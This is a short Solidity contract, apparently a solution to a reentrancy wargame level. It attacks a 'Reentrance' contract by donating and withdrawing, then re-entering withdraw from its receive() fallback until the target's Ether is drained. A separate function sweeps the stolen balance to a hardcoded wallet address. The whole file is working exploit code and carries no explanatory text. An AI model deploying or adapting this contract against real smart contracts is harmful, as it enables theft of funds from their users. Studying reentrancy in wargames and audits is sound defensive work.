// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentrantAttack {
    Reentrance reentrance;
    uint public attackAmount;

    constructor(address _target) {
        reentrance = Reentrance(payable(_target));
    }

    receive() external payable {
        reentrance.withdraw(attackAmount);
    }

    function attack() public payable {
        attackAmount = msg.value;
        reentrance.donate{value: attackAmount}(address(this));
        reentrance.withdraw(attackAmount);
    }

    function withdraw() public payable {
        address to = payable(0x0bae3B8E702eA3e9F85594ca69Baa9aA3f2F901B);
        (bool sent, ) = to.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
